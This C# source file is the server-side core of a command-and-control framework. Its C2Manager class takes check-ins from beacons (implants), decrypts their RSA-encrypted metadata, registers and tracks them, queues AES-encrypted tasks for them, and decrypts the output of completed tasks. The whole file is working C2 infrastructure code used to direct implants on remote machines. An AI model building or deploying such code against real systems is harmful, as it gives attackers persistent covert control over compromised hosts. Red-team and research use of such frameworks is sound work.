using System.Buffers.Binary;
using Server.Beacons;
using Server.Core;
using Server.Listeners;
using Server.Tasks;
using TaskStatus = Server.Tasks.TaskStatus;

namespace Server.C2Bridge;

public sealed class C2Manager(IRepository<Listener> listeners, IRepository<Beacon> beacons, IBroker<Beacon> beaconBroker, IRepository<BeaconTask> tasks, TaskBroker taskBroker)
{
    public async Task<byte[]> ProcessBeaconMessage(uint listenerId, byte[] data, CancellationToken ct)
    {
        using var ms = new MemoryStream(data);
        using var br = new BinaryReader(ms);

        do
        {
            // read the callback type
            var bType = br.ReadBytes(sizeof(uint));
            var callbackType = BinaryPrimitives.ReadInt32BigEndian(bType.AsSpan());
            
            // read task id
            var bId = br.ReadBytes(sizeof(uint));
            var taskId = BinaryPrimitives.ReadUInt32BigEndian(bId.AsSpan());
            
            // read data length
            var bLength = br.ReadBytes(sizeof(int));
            var length = BinaryPrimitives.ReadInt32BigEndian(bLength.AsSpan());
            
            // read the message
            var message = br.ReadBytes(length);
            
            switch (callbackType)
            {
                case 0x1:
                {
                    var beacon = await HandleBeaconCheckin(listenerId, message, ct);
                    
                    if (beacon is null)
                        break;
                    
                    return await GetOutboundTasks(beacon, ct);
                }

                default:
                {
                    var bComplete = br.ReadBytes(sizeof(int));
                    var complete = BinaryPrimitives.ReadInt32BigEndian(bComplete.AsSpan());
                    
                    await HandleBeaconOutput(callbackType, taskId, message, complete, ct);
                    
                    break;
                }
            }

        } while (ms.Position < ms.Length);

        return [];
    }

    private async Task<Beacon?> HandleBeaconCheckin(uint listenerId, byte[] data, CancellationToken ct)
    {
        // data should be rsa-encrypted metadata
        // get the listener
        var listener = await listeners.GetByIdAsync(listenerId, ct);

        if (listener is null)
            return null;

        var decrypted = Crypto.RsaDecrypt(data, listener.PrivateKey);
        
        // should be metadata
        var metadata = BeaconMetadata.Parse(decrypted);

        // fetch from the db
        var beacon = await beacons.GetByIdAsync(metadata.Id, ct);

        if (beacon is null)
        {
            // first time seeing this beacon
            beacon = Beacon.Create(metadata, listener.Name);
            await beacons.AddAsync(beacon, ct);
        }
        else
        {
            // do a checkin
            beacon.CheckIn();
        }

        // save changes
        await beacons.UpdateAsync(beacon, ct);

        // pub event
        beaconBroker.Publish(beacon);

        return beacon;
    }

    private async Task<byte[]> GetOutboundTasks(Beacon parent, CancellationToken ct)
    {
        var spec = new ListPendingTasksSpec(parent.Id);
        var pending = await tasks.ListAsync(spec, ct);

        using var ms = new MemoryStream();

        foreach (var task in pending)
        {
            // encrypt task with beacon's aes key
            using var taskData = new MemoryStream();
            
            // write the task id
            var taskId = new byte[sizeof(uint)];
            BinaryPrimitives.WriteUInt32BigEndian(taskId, task.Id);
            await taskData.WriteAsync(taskId.AsMemory(), ct);

            // write the task type
            var taskType = new byte[sizeof(int)];
            BinaryPrimitives.WriteInt32BigEndian(taskType, (int)task.TaskType);
            await taskData.WriteAsync(taskType.AsMemory(), ct);
            
            // write the length of task data
            var taskLen =  new byte[sizeof(int)];
            BinaryPrimitives.WriteInt32BigEndian(taskLen, task.TaskData?.Length ?? 0);
            await taskData.WriteAsync(taskLen.AsMemory(), ct);

            // write the task data
            await taskData.WriteAsync(task.TaskData?.AsMemory() ?? Array.Empty<byte>().AsMemory(), ct);
            
            // encrypt the task
            var encrypted = Crypto.AesEncrypt(taskData.ToArray(), parent.SessionKey);
            
            var encryptedLen = new byte[sizeof(int)];
            BinaryPrimitives.WriteInt32BigEndian(encryptedLen, encrypted.Length);
            
            // write the encrypted task len
            await ms.WriteAsync(encryptedLen.AsMemory(), ct);
            
            // write the encrypted task
            await ms.WriteAsync(encrypted.AsMemory(), ct);
            
            // update the task record
            task.SetTasked();
            
            // pub update
            taskBroker.Publish(new BeaconCallback
            {
                TaskId = task.Id,
                Status = TaskStatus.Tasked,
                Output = []
            });
        }

        // update the db
        await tasks.UpdateRangeAsync(pending, ct);
        await tasks.SaveChangesAsync(ct);
        
        // return all the task data
        return ms.ToArray();
    }

    private async Task HandleBeaconOutput(int callbackType, uint taskId, byte[] taskData, int complete, CancellationToken ct)
    {
        // task data is encrypted with the beacon's aes key
        
        // get the task
        var task = await tasks.GetByIdAsync(taskId, ct);
        
        if (task is null)
            return;
        
        // get the beacon
        var beacon = await beacons.GetByIdAsync(task.BeaconId, ct);
        
        if (beacon is null)
            return;
        
        // decrypt the data
        var plaintext = Crypto.AesDecrypt(taskData, beacon.SessionKey);
        
        var callback = new BeaconCallback
        {
            Type = callbackType,
            TaskId = taskId,
            Output = plaintext,
            Status = TaskStatus.Tasked
        };

        // if output is complete
        if (complete == 1)
        {
            callback.Status = TaskStatus.Complete;
            task.SetComplete();
            
            await tasks.UpdateAsync(task, ct);
            
            // did the beacon exit?
            if (task.TaskType is TaskType.Exit)
            {
                beacon.SetHealth(BeaconHealth.Dead);
                        
                await beacons.UpdateAsync(beacon, ct);
                beaconBroker.Publish(beacon);
            }

            await tasks.SaveChangesAsync(ct);
        }

        // pub
        taskBroker.Publish(callback);
    }
}